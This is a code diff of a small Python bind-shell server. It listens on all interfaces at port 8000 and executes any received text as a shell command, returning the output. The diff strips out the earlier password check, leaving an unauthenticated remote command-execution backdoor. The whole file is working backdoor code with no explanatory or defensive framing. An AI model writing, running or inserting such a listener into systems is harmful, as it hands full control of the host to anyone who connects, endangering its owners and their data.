@@ -1,65 +1,24 @@
 import socket
 import subprocess
 
-HOST = ''
+# HOST = "192.168.64.5"
+HOST = "0.0.0.0"
 PORT = 8000
-PASSWORD = "aidnid"
 
-server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-server.bind((HOST, PORT))
+# --- Main Logic ---
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
 
+try:
+    s.bind((HOST, PORT))
+    s.listen(1)
+    conn, addr = s.accept()
+    while True:
+        command = conn.recv(1024).decode()
 
-def login():
-    print('Server Started')
-    print('Listening for Client Connection...')
-    server.listen(1)
-
-    global client, client_addr
-    client, client_addr = server.accept()
-    print('Connection established from', client_addr)
-
-    try:
-        password = client.recv(1024).strip()
-
-        if len(password) == 0:
-            print('Failed Login')
-            client.close()
-            return False
-
-        print('Password attempt:', password)
-
-        if password == PASSWORD:
-            print('Login Success')
-            return True
-        else:
-            print('Failed Login')
-            client.close()
-            return False
-
-    except Exception as e:
-        print('Login Exception:', e)
-        client.close()
-        return False
-
-
-login_status = False
-while not login_status:
-    login_status = login()
-
-
-while True:
-    try:
-        print('Awaiting Command')
-
-        command = client.recv(1024).strip()
-
-        if not command:
-            raise Exception("Client disconnected")
-
-        if command == 'exit':
-            client.close()
+        if command.lower() in ["exit", "quit"]:
             break
-
+            
         op = subprocess.Popen(
             command,
             shell=True,
@@ -67,21 +26,12 @@ while True:
             stderr=subprocess.PIPE
         )
 
-        output, error = op.communicate()
+        output, _ = op.communicate()
 
-        result = output + error
+        if not output:
+            output = b"Command executed, but no output/an error was returned."
 
-        if len(result) == 0:
-            client.send('no stdout')
-        else:
-            client.send(result)
+        conn.send(output)
 
-    except Exception as e:
-        print('Main Loop Exception:', e)
-
-        login_status = False
-        while not login_status:
-            login_status = login()
-
-server.close()
-print('Connection Closed')
+finally:
+    s.close()
